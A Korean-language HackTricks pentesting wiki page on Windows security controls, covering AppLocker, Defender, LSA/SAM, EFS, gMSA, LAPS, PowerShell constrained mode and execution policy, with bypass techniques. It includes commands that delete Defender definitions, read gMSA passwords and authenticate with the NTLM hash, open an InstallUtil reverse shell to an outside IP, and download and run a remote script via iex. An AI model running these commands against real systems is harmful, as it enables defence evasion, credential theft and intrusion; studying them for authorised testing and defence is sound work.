# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

애플리케이션 whitelist는 시스템에 존재하고 실행할 수 있도록 허용된 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 목표는 조직의 특정 비즈니스 요구 사항에 부합하지 않는 유해한 malware와 승인되지 않은 software로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **application whitelisting solution**이며, 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어**할 수 있도록 합니다. 실행 파일, scripts, Windows installer files, DLLs, packaged apps 및 packed app installers에 대해 **세분화된 제어**를 제공합니다.\
조직에서는 **cmd.exe와 PowerShell.exe를 차단**하고 특정 디렉터리에 대한 쓰기 권한을 제한하는 경우가 많지만, **이 모든 조치는 우회할 수 있습니다**.

### 확인

blacklist/whitelist된 파일 및 확장자를 확인합니다:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로에는 AppLocker가 적용하는 구성 및 정책이 포함되어 있어, 시스템에서 현재 적용 중인 규칙을 검토할 수 있습니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy를 우회하는 데 유용한 **Writable folders**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내부의 모든 항목 실행을 허용하는 경우, 이를 **bypass**하는 데 사용할 수 있는 **writable folders**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리도 AppLocker를 우회하는 데 유용할 수 있습니다.
- **제대로 작성되지 않은 규칙도 우회할 수 있습니다.**
- 예를 들어 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**의 경우, 어디에든 **`allowed`라는 폴더를 생성**하면 허용됩니다.
- 조직은 또한 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단하는 데** 집중하는 경우가 많지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)을 간과합니다.
- **DLL enforcement**는 시스템에 추가적인 부하를 줄 수 있고 아무것도 손상되지 않는지 확인하기 위해 많은 테스트가 필요하기 때문에 거의 활성화되지 않습니다. 따라서 **DLL을 backdoor로 사용하면 AppLocker를 우회하는 데 도움이 됩니다.**
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 모든 프로세스에서 **Powershell** 코드를 **execute**하고 AppLocker를 우회할 수 있습니다. 자세한 내용은 다음을 참조하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

로컬 credentials가 이 파일에 존재하며, passwords는 hash 처리됩니다.

### Local Security Authority (LSA) - LSASS

Single Sign-On을 위해 이 subsystem의 **memory**에 **credentials**(hashed)가 **저장**됩니다.\
**LSA**는 로컬 **security policy**(password policy, users permissions...), **authentication**, **access tokens** 등을 관리합니다.\
LSA는 **SAM** 파일에서 제공된 **credentials**(로컬 login의 경우)를 **확인**하고, domain user를 authenticate하기 위해 **domain controller**와 **통신**합니다.

**credentials**는 **process LSASS** 내부에 **저장**됩니다: Kerberos tickets, NT 및 LM hashes, 쉽게 decrypt할 수 있는 passwords.

### LSA secrets

LSA는 일부 credentials를 disk에 저장할 수 있습니다:

- Active Directory의 computer account password (연결할 수 없는 domain controller).
- Windows services account의 passwords
- scheduled tasks의 passwords
- 기타 (IIS applications의 password...)

### NTDS.dit

Active Directory의 database입니다. Domain Controllers에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11과 Windows Server 버전에서 사용할 수 있는 Antivirus입니다. **`WinPEAS`**와 같은 일반적인 pentesting tools를 **차단**합니다. 그러나 이러한 **protections를 우회하는 방법**이 있습니다.

### Check

**Defender**의 **status**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 execute할 수 있습니다(**`RealTimeProtectionEnabled`** 값을 확인하여 active 상태인지 알 수 있습니다):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

이를 enumerate하려면 다음을 실행할 수도 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템 (EFS)

EFS는 **File Encryption Key (FEK)**로 알려진 **대칭 키**를 사용하여 파일을 암호화함으로써 파일을 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되며, 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요할 때는 사용자의 디지털 인증서에 해당하는 **개인 키**를 사용하여 $EFS 스트림에서 FEK를 복호화합니다. 자세한 내용은 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자 개입 없이 복호화되는 시나리오**는 다음과 같습니다:

- 파일 또는 폴더가 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 비-EFS 파일 시스템으로 이동되면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식은 소유자가 암호화된 파일에 **투명하게 액세스**할 수 있도록 합니다. 그러나 단순히 소유자의 비밀번호를 변경하고 로그인하는 것만으로는 복호화할 수 없습니다.

**핵심 요점**:

- EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화에는 사용자의 개인 키를 사용하여 FEK에 액세스합니다.
- FAT32로 복사하거나 네트워크로 전송하는 경우와 같은 특정 조건에서 자동으로 복호화됩니다.
- 소유자는 추가 작업 없이 암호화된 파일에 액세스할 수 있습니다.

### EFS 정보 확인

다음 경로가 존재하는지 확인하여 **사용자**가 이 **서비스를 사용했는지** 확인합니다:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\을 사용하여 파일에 **액세스할 수 있는 사용자**를 확인합니다.  
폴더 내에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **암호화**하고 **복호화**할 수도 있습니다.

### EFS 파일 복호화

#### Authority System인 경우

이 방법을 사용하려면 호스트 내부에서 **피해자 사용자의** **프로세스가 실행 중**이어야 합니다. 그런 경우 `meterpreter` sessions을 사용하여 해당 사용자 프로세스의 토큰을 가장할 수 있습니다(`incognito`의 `impersonate_token`). 또는 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 비밀번호를 알고 있는 경우


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## 그룹 관리 서비스 계정 (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 간소화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. "**Password never expire**" 설정이 활성화되어 있는 경우가 많은 기존 서비스 계정과 달리, gMSA는 더욱 안전하고 관리하기 쉬운 솔루션을 제공합니다:

- **자동 비밀번호 관리**: gMSA는 도메인 또는 컴퓨터 정책에 따라 자동으로 변경되는 240자의 복잡한 비밀번호를 사용합니다. 이 과정은 Microsoft의 Key Distribution Service (KDC)가 처리하므로 수동으로 비밀번호를 업데이트할 필요가 없습니다.
- **향상된 보안**: 이러한 계정은 lockout의 영향을 받지 않으며 interactive login에 사용할 수 없어 보안이 향상됩니다.
- **여러 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있으므로 여러 서버에서 실행되는 서비스에 적합합니다.
- **Scheduled Task 기능**: managed service accounts와 달리 gMSA는 scheduled task 실행을 지원합니다.
- **간소화된 SPN 관리**: 컴퓨터의 sAMaccount 세부 정보 또는 DNS 이름이 변경되면 시스템이 Service Principal Name (SPN)을 자동으로 업데이트하여 SPN 관리를 간소화합니다.

gMSA의 비밀번호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 Domain Controllers (DCs)에 의해 30일마다 자동으로 재설정됩니다. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 data blob인 이 비밀번호는 권한이 부여된 관리자와 gMSA가 설치된 서버만 검색할 수 있어 안전한 환경을 보장합니다. 이 정보에 액세스하려면 LDAPS와 같은 보안 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)<sup>[[1]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**를 사용하여 이 비밀번호를 읽을 수 있습니다.<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**이 post에서 더 많은 정보 확인**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[1]](#references)</sup>

또한 **gMSA**의 **password**를 **read**하기 위해 **NTLM relay attack**을 수행하는 방법은 이 [web page](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하세요.<sup>[[1]](#references)</sup>

### ACL chaining을 악용하여 gMSA managed password 읽기 (GenericAll -> ReadGMSAPassword)

많은 환경에서 권한이 낮은 사용자는 잘못 구성된 object ACL을 악용하여 DC를 compromise하지 않고도 gMSA secrets로 pivot할 수 있습니다:<sup>[[3]](#references)</sup>

- 사용자가 control할 수 있는 group(예: GenericAll/GenericWrite를 통해)에 gMSA에 대한 `ReadGMSAPassword` 권한이 부여됩니다.
- 자신을 해당 group에 추가하면 LDAP를 통해 gMSA의 `msDS-ManagedPassword` blob을 읽고 사용 가능한 NTLM credentials를 도출할 권한을 상속합니다.

일반적인 workflow:

1) BloodHound로 경로를 발견하고 foothold principals를 Owned로 표시합니다. 다음과 같은 edge를 찾습니다:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 자신이 control하는 intermediate group에 자신을 추가합니다(bloodyAD 사용 예):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP를 통해 gMSA 관리 비밀번호를 읽고 NTLM hash를 도출합니다. NetExec는 `msDS-ManagedPassword` 추출 및 NTLM 변환을 자동화합니다:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash를 사용하여 gMSA로 인증합니다(평문은 필요하지 않음). 계정이 Remote Management Users에 속해 있으면 WinRM이 직접 작동합니다:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
참고:
- `msDS-ManagedPassword`에 대한 LDAP 읽기에는 sealing(예: LDAPS/sign+seal)이 필요합니다. 도구가 이를 자동으로 처리합니다.
- gMSAs에는 종종 WinRM과 같은 로컬 권한이 부여되므로, lateral movement를 계획할 때 그룹 멤버십(예: Remote Management Users)을 확인해야 합니다.
- blob만 사용해 직접 NTLM을 계산하려는 경우 MSDS-MANAGEDPASSWORD_BLOB structure를 참조하세요.



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있는 **Local Administrator Password Solution (LAPS)**은 로컬 Administrator password를 관리할 수 있도록 합니다. **randomized**되고 고유하며 **정기적으로 변경되는** 이러한 password는 Active Directory에 중앙에서 저장됩니다. 이러한 password에 대한 액세스는 ACL을 통해 authorized users로 제한됩니다. 충분한 권한이 부여되면 local admin password를 읽을 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하는 데 필요한 많은 기능을 **제한합니다**. 예를 들어 COM objects를 차단하고, 승인된 .NET types만 허용하며, XAML-based workflows와 PowerShell classes 등을 제한합니다.

### **확인**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 해당 Bypass가 작동하지 않지만 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하려면** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경해야 할 수 있습니다**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하면 모든 프로세스에서 **Powershell** 코드를 **실행**하고 constrained mode를 우회할 수 있습니다. 자세한 내용은 다음을 참조하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS 실행 정책

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More는 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>에서 확인할 수 있습니다.

## Security Support Provider Interface (SSPI)

사용자를 인증하는 데 사용할 수 있는 API입니다.

SSPI는 통신하려는 두 시스템에 적합한 프로토콜을 찾는 역할을 담당합니다. 이때 선호되는 방식은 Kerberos입니다. 그런 다음 SSPI는 사용할 인증 프로토콜을 협상합니다. 이러한 인증 프로토콜을 Security Support Provider (SSP)라고 하며, 각 Windows 시스템 내부에 DLL 형태로 존재합니다. 통신하려면 두 시스템이 동일한 SSP를 지원해야 합니다.

### 주요 SSP

- **Kerberos**: 선호되는 방식
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성을 위한 방식
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web 서버와 LDAP에서 사용되며, 비밀번호는 MD5 hash 형태
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됨(Kerberos 또는 NTLM이며 기본값은 Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### 협상 과정에서 여러 가지 방식 또는 하나의 방식만 제안될 수 있습니다.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 작업에 대한 동의 프롬프트**를 활성화하는 기능입니다.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
